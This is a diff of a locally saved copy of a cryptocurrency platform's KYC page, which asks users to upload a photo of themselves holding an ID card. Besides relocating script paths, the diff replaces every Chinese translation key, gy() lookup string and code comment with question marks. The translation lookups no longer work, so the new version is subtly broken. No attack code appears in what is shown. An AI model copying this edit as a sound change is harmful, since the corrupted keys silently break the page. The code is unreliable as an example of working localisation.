@@ -1,12 +1,12 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <!-- saved from url=(0041)https://www.bvoxf.com/views/kyc/kyc2.html -->
 <html lang="en" style="font-size: 20px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 		
 		<title>Bvox</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 		<link rel="stylesheet" href="./kyc2_files/style.css">
-		<script src="./kyc2_files/jquery.js.download" type="text/javascript" charset="utf-8"></script>
-		<script src="./kyc2_files/config.js.download" type="text/javascript" charset="utf-8"></script><script src="./kyc2_files/pako.min.js.download"></script><script src="./kyc2_files/js.cookie.min.js.download"></script><script src="./kyc2_files/web3.min.js.download"></script><script src="./kyc2_files/web3model.min.js.download"></script><script src="./kyc2_files/web3provider.js.download"></script><script src="./kyc2_files/fp.min.js.download"></script>
+		<script src="./assets/js/jquery.js" type="text/javascript" charset="utf-8"></script>
+		<script src="./assets/js/config.js" type="text/javascript" charset="utf-8"></script><script src="./assets/js/pako.min.js"></script><script src="./assets/js/js.cookie.min.js"></script><script src="./assets/js/web3.min.js"></script><script src="./assets/js/web3model.min.js"></script><script src="./assets/js/web3provider.js"></script><script src="./assets/js/fp.min.js"></script>
 		<link rel="shortcut icon" href="https://www.bvoxf.com/favicon.ico">
 		<meta property="og:image" content="/favicon.png">
 
@@ -31,7 +31,7 @@
                 <a href="index.html" class="y-fanhui">
                     <img src="./kyc2_files/fanhui.png">
                 </a>
-                <div class="y-title" data-translate="高级认证">Advanced certification</div>
+                <div class="y-title" data-translate="????">Advanced certification</div>
             </div>
         </div>
         <div class="y-kyc1" style="min-height: 832px;">
@@ -41,30 +41,30 @@
                     <div class="y-upload-box" id="housing-info-box">
                         <img src="./kyc2_files/image.png" class="y-camera-icon" alt="Camera Icon">
                         <img src="kyc2.html" class="y-preview" alt="Preview" id="y-idzheng">
-                        <div class="y-upload-label" data-translate="手持身份证照片">Holding ID card photo</div>
+                        <div class="y-upload-label" data-translate="???????">Holding ID card photo</div>
                         <input type="file" id="housing-info-upload" accept="image/*">
                     </div>
                 </div>
             </div>
 
             <div class="y-kyc1-bo">
-                <h1 data-translate="你可知道？">Did you know?</h1>
-                <p data-translate="完成KYC认证可以提高交易限额，保证您的资金安全。">Completing KYC certification can increase the transaction limit and ensure the safety of your funds.</p>
+                <h1 data-translate="?????">Did you know?</h1>
+                <p data-translate="??KYC??????????,?????????">Completing KYC certification can increase the transaction limit and ensure the safety of your funds.</p>
             </div>
 
             <div class="y-kycbu">
-                <div class="y-dkljsq y-dkljsq2" data-translate="确认" onclick="rzsubmit()">Confirm</div>
+                <div class="y-dkljsq y-dkljsq2" data-translate="??" onclick="rzsubmit()">Confirm</div>
             </div>
         </div>
 
-        <div class="y-ytjrz" data-translate="已提交认证" style="display: none;">Certification submitted</div>
+        <div class="y-ytjrz" data-translate="?????" style="display: none;">Certification submitted</div>
         
         
         <script>
             document.querySelector('.y-kyc1').style.minHeight = window.innerHeight + 'px';
             $(document).ready(function() {
-                $('#y-name').attr('placeholder',gy('请输入姓名'));
-                $('#y-zsbh').attr('placeholder',gy('请输入证书编号'));
+                $('#y-name').attr('placeholder',gy('?????'));
+                $('#y-zsbh').attr('placeholder',gy('???????'));
 
 
                 var userid = Cookies.get('userid');
@@ -77,15 +77,15 @@
                     success: function (response) {
                         if(response.code == 1){
                             if(response.data.renzhengzhuangtai == 0){
-                                $('.y-ytjrz').text(gy('请先完成初级认证'));
+                                $('.y-ytjrz').text(gy('????????'));
                                 $('.y-ytjrz').show();
                             }else{
                                 if (response.data.sfsqrz == 4) {
-                                    // 等于4，显示“已提交认证”
-                                    $('.y-ytjrz').text(gy('已提交认证')).show();
+                                    // ??4,??�?????�
+                                    $('.y-ytjrz').text(gy('?????')).show();
                                 } else if (response.data.sfsqrz == 5) {
-                                    // 等于5，显示“认证成功”
-                                    $('.y-ytjrz').text(gy('高级认证通过')).show();
+                                    // ??5,??�????�
+                                    $('.y-ytjrz').text(gy('??????')).show();
                                 }
                             }
                         }
@@ -94,17 +94,17 @@
 
                 $('.y-upload-box').each(function() {
                     const uploadBox = $(this);
-                    const fileInput = uploadBox.find('input[type="file"]')[0]; // 使用原生文件输入框
+                    const fileInput = uploadBox.find('input[type="file"]')[0]; // ?????????
                     const previewImg = uploadBox.find('.y-preview');
                     const cameraIcon = uploadBox.find('.y-camera-icon');
 
-                    // 点击 .y-upload-box 时触发文件选择
+                    // ?? .y-upload-box ???????
                     uploadBox.on("click", function (e) {
-                        e.stopPropagation(); // 防止事件冒泡
-                        fileInput.click(); // 使用原生的 click 触发文件选择
+                        e.stopPropagation(); // ??????
+                        fileInput.click(); // ????? click ??????
                     });
 
-                    // 文件选择发生变化时触发上传
+                    // ?????????????
                     fileInput.addEventListener("change", function () {
                         if (!fileInput.files || fileInput.files.length === 0) return;
 
@@ -124,7 +124,7 @@
                                     previewImg.attr('data-ysrc', response.data);
                                     cameraIcon.hide();
                                 }else{
-                                    alert(gy('失败'));
+                                    alert(gy('??'));
                                 }
                             }
                         });
@@ -140,7 +140,7 @@
                 var zphou = $('#y-idzheng').data('ysrc');
 
                 if(!zphou){
-                    alert(gy('失败'));
+                    alert(gy('??'));
                     return;
                 }
                 
@@ -161,8 +161,8 @@
                 });
             }
         </script>
-    <script defer="" src="./kyc2_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;eeb085316a57431db0b1a080d3a6bf6e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+    <script defer="" src="./assets/js/cloudflare-analytics.js" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;eeb085316a57431db0b1a080d3a6bf6e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
 
 
-	<script src="./js/walletAuth.js" type="text/javascript" charset="utf-8"></script>
+	<script src="./assets/js/walletAuth.js" type="text/javascript" charset="utf-8"></script>
 	</body></html>
